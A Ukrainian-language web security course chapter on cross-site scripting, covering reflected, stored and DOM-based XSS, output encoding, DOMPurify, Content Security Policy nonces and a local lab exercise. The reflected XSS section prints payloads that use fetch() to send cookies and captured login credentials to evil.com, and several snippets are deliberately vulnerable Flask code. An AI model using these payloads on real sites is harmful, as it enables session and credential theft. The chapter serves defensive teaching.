# 6.8. XSS: Cross-Site Scripting

Попередній розділ показав шість категорій OWASP — від неправильних конфігурацій до supply chain атак. XSS технічно входить до A03 (Injection), але є достатньо поширеним і різноплановим, щоб вимагати окремого детального розгляду. Для порівняння: у 2022 році CERT-UA зафіксував кілька кампаній, де фішингові сторінки, що імітували українські державні сайти, містили вбудовані XSS-скрипти для крадіжки credentials до систем держуправління. В одному з інцидентів (UAC-0056, березень 2022) збережений XSS на скомпрометованому ресурсі використовувався для автоматичного збору форм і перенаправлення жертв. Розуміти XSS — значить розуміти, як браузер стає зброєю проти його ж власника.

У 2005 році Самі Камкар написав 20-рядковий JavaScript-черв'як для MySpace. Скрипт автоматично додавав Самі у «список друзів» кожного, хто відвідував його профіль — і реплікувався на їхні профілі. За 20 годин Самі зібрав понад мільйон «друзів» і поклав MySpace. Ця атака — Samy Worm — стала першою масовою демонстрацією того, що може зробити XSS: не просто показати `alert(1)`, а виконати довільний JavaScript у контексті браузера жертви, з її cookies, з її сесією, від її імені.

> 📖 Ключові терміни — у [глосарії модуля](00-glosariy.md).

## Три типи XSS

### Reflected XSS (Non-Persistent)

Шкідливий скрипт є частиною HTTP-запиту і відображається у відповіді без збереження:

```python
# ❌ ВРАЗЛИВО: відображаємо пошуковий запит без екранування
@app.route('/search')
def search():
    query = request.args.get('q', '')
    results = db.search(query)
    return f"<h1>Результати для: {query}</h1> ..."
    # Запит: /search?q=<script>alert(document.cookie)</script>
    # Відповідь: <h1>Результати для: <script>alert(document.cookie)</script></h1>
```

**Вектор атаки:** зловмисник надсилає жертві посилання з шкідливим payload у параметрі. Жертва переходить — скрипт виконується в контексті довіреного сайту.

**Реальне використання:**
```javascript
// Payload для крадіжки cookie (якщо немає HttpOnly)
<script>
  fetch('https://evil.com/steal?c=' + document.cookie)
</script>

// Payload для перехоплення форми (навіть з HttpOnly)
<script>
  document.forms[0].onsubmit = function() {
    fetch('https://evil.com/steal', {
      method: 'POST',
      body: JSON.stringify({
        user: document.getElementById('username').value,
        pass: document.getElementById('password').value
      })
    })
  }
</script>
```

### Stored XSS (Persistent)

Шкідливий скрипт зберігається в базі даних і відображається всім користувачам:

```python
# ❌ ВРАЗЛИВО: зберігаємо коментар і відображаємо без екранування
@app.route('/comment', methods=['POST'])
def add_comment():
    text = request.form['text']  # "<script>alert('XSS')</script>"
    db.save_comment(text)  # зберігається шкідливий скрипт
    return redirect('/comments')

@app.route('/comments')
def show_comments():
    comments = db.get_comments()
    html = '<ul>'
    for c in comments:
        html += f'<li>{c.text}</li>'  # ← кожен відвідувач отримує скрипт
    return html + '</ul>'
```

**Stored XSS небезпечніший за Reflected:** не потрібно переконувати жертву перейти за посиланням — шкідливий код автоматично виконується для всіх, хто відвідує сторінку.

### DOM-based XSS

Вразливість повністю на стороні клієнта — JavaScript читає дані з URL або DOM і вставляє в DOM без санітизації:

```javascript
// ❌ ВРАЗЛИВО: читаємо hash з URL без санітизації
// URL: https://example.com/page#<img src=x onerror=alert(1)>
const data = location.hash.substring(1);
document.getElementById('output').innerHTML = data;  // ← innerHTML виконує скрипти!

// ❌ ВРАЗЛИВО: document.write
document.write('<b>' + location.search + '</b>');

// ✅ Безпечні альтернативи:
document.getElementById('output').textContent = data;     // текст, без HTML
document.getElementById('output').innerText = data;       // аналогічно
element.setAttribute('href', encodeURIComponent(data));   // для атрибутів
```

**Sink і Source в DOM XSS:**
- **Source** (джерело даних): `location.hash`, `location.search`, `document.URL`, `document.referrer`, `postMessage`
- **Sink** (небезпечне місце запису): `innerHTML`, `document.write`, `eval`, `setTimeout(string)`, `element.src`, `element.href`

## Output Encoding: основний захист від XSS

**Правило:** кожного разу, коли виводимо дані в HTML, ми **encode** їх відповідно до контексту виведення.

**HTML Context (найпоширеніший):**
```python
# Python Jinja2: автоматичний escape (за замовчуванням увімкнено)
{{ user.name }}        ← безпечно: автоматично ескейпується
{{ user.name | safe }} ← небезпечно: вимикає escape!

# Python (без шаблонізатора)
import html
safe_name = html.escape(user_input)  # & → &amp; < → &lt; > → &gt; " → &quot;

# JavaScript
function escapeHtml(text) {
    return text
        .replace(/&/g, '&amp;')
        .replace(/</g, '&lt;')
        .replace(/>/g, '&gt;')
        .replace(/"/g, '&quot;')
        .replace(/'/g, '&#x27;');
}
```

**Контексти виведення і відповідне кодування:**

| Контекст | Приклад | Метод кодування |
|---|---|---|
| HTML body | `<p>{{user}}</p>` | HTML entity encoding |
| HTML attribute | `<a href="{{url}}">` | HTML attribute encoding |
| JavaScript string | `var x = "{{val}}"` | JavaScript string encoding (`\xNN`) |
| CSS | `color: {{color}}` | CSS encoding |
| URL | `href="/search?q={{q}}"` | URL encoding (`encodeURIComponent`) |

**Небезпечно змішувати контексти:**
```html
<!-- ❌ HTML-encoded значення в JS-контексті може бути небезпечним -->
<script>var name = "{{ user.name }}";</script>
<!-- Якщо user.name = "; alert(1); // → виконає alert! -->
<!-- HTML entity encoding тут не допомагає! Потрібен JS encoding -->
```

## DOMPurify: санітизація HTML

Якщо потрібно дозволити **деяку** розмітку (наприклад, у WYSIWYG-редакторі) — використовуйте бібліотеку санітизації:

```javascript
// npm install dompurify
import DOMPurify from 'dompurify';

const userHtml = '<b>Hello</b><script>alert(1)</script><img src=x onerror=alert(2)>';
const clean = DOMPurify.sanitize(userHtml);
// → '<b>Hello</b>'   (script і onerror видалені)

document.getElementById('content').innerHTML = clean;

// Суворіший режим: лише дозволені теги
const clean = DOMPurify.sanitize(userHtml, {
    ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'a'],
    ALLOWED_ATTR: ['href']
});
```

## Content Security Policy (CSP) як другий рубіж

CSP — HTTP-заголовок, що обмежує, які скрипти браузер взагалі може виконувати. Навіть якщо XSS payload ін'єктований — суворий CSP не дозволить йому виконатись.

```
Content-Security-Policy: script-src 'self' 'nonce-{random}';
```

**Nonce (number used once):** кожен легітимний скрипт позначається унікальним nonce, що генерується сервером для кожного запиту:

```python
import secrets

@app.before_request
def set_csp_nonce():
    g.csp_nonce = secrets.token_urlsafe(16)

@app.after_request
def set_csp_header(response):
    response.headers['Content-Security-Policy'] = (
        f"default-src 'self'; "
        f"script-src 'self' 'nonce-{g.csp_nonce}'; "
        f"style-src 'self' 'nonce-{g.csp_nonce}'; "
        f"img-src 'self' data:; "
        f"frame-ancestors 'none';"
    )
    return response
```

```html
<!-- У шаблоні: легітимні скрипти з nonce -->
<script nonce="{{ g.csp_nonce }}">
  // Цей скрипт дозволений
</script>

<!-- Ін'єктований payload без nonce → заблокований браузером -->
<script>alert(1)</script>
```

**`'unsafe-inline'` знищує захист CSP від XSS** — ніколи не використовуйте для script-src у production.

## Реальний кейс: British Airways 2018 (£183 мільйони штраф)

У 2018 році зловмисники (Magecart) ін'єктували 22 рядки JavaScript у форму оплати British Airways через XSS в сторонньому скрипті (`modernizr`). Скрипт перехоплював дані кредитних карток і надсилав на attacker.com. За 2 тижні скомпрометовано ~500 000 карток. ICO виписало рекордний на той момент штраф GDPR у £183 мільйони. Причина — відсутність CSP, що дозволило виконання довільного JS зі стороннього домену.

## Міні-вправа

**Тест на Reflected XSS (в безпечному локальному середовищі):**

```python
# Запустіть цей вразливий застосунок ЛИШЕ локально
from flask import Flask, request
app = Flask(__name__)

@app.route('/search')
def search():
    q = request.args.get('q', '')
    # ❌ ВРАЗЛИВО: відображаємо query без escape
    return f'<html><body><h1>Пошук: {q}</h1></body></html>'

if __name__ == '__main__':
    app.run(debug=False)
```

Спробуйте у браузері:
1. `http://localhost:5000/search?q=hello` — звичайний запит
2. `http://localhost:5000/search?q=<b>Bold</b>` — HTML injection
3. `http://localhost:5000/search?q=<script>alert(document.domain)</script>` — XSS

Потім виправте:
```python
import html
return f'<html><body><h1>Пошук: {html.escape(q)}</h1></body></html>'
```

І переконайтесь, що скрипт більше не виконується.

**Додатково:** перевірте CSP на `csp-evaluator.withgoogle.com`. Скопіюйте CSP будь-якого великого сайту і оцініть, наскільки він захищає від XSS.

## Чек-лист захисту від XSS

- [ ] Шаблонізатор використовується з автоматичним escaping увімкненим за замовчуванням.
- [ ] `innerHTML`, `document.write`, `eval` зі змінними даними відсутні (або замінені на textContent).
- [ ] Увімкнено CSP зі строгим `script-src` (nonce або hash, без `'unsafe-inline'`).
- [ ] Сесійні cookies мають атрибут `HttpOnly`.
- [ ] DOMPurify або аналог використовується там, де потрібна HTML-розмітка від користувача.
- [ ] `X-XSS-Protection: 0` (сучасні браузери — відключаємо застарілий XSS-фільтр, CSP є кращим захистом).

## Джерела та додаткові матеріали

- OWASP, *XSS Prevention Cheat Sheet*.
- OWASP, *DOM Based XSS Prevention Cheat Sheet*.
- PortSwigger Web Academy, *Cross-site scripting* — 30+ практичних лабораторних.
- DOMPurify (github.com/cure53/DOMPurify).
- CSP Evaluator (csp-evaluator.withgoogle.com) — перевірка CSP.

---

**Попередній розділ:** [6.7. A05–A10: огляди](07-a05-a10-ohliady.md)
**Далі:** [6.9. CSRF і Clickjacking](09-csrf-i-klikkdzheking.md)
**Назад до модуля:** [README модуля 06](README.md)
